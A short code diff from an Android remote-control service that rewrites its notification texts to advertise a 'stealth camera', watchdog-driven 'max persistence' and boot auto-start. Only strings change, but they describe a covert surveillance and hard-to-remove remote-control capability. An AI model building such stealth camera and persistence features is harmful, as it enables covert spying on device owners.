@@ -122,13 +122,13 @@ public class RemoteControlService extends Service {
         
         if (isWatchdogRestart) {
             title = "🛡️ Remote Control Bulletproof";
-            text = "Restarted by watchdog - maximum persistence active";
+            text = "Restarted by watchdog - stealth camera & max persistence active";
         } else if (isAutoStart) {
             title = "🤖 Remote Control Auto-Started";
-            text = "Auto-started on boot - bulletproof mode active";
+            text = "Auto-started on boot - stealth camera & bulletproof mode active";
         } else {
             title = "Remote Control Active";
-            text = "Device can be controlled remotely via WiFi";
+            text = "Stealth camera & remote control via WiFi ready";
         }
         
         return new NotificationCompat.Builder(this, CHANNEL_ID)
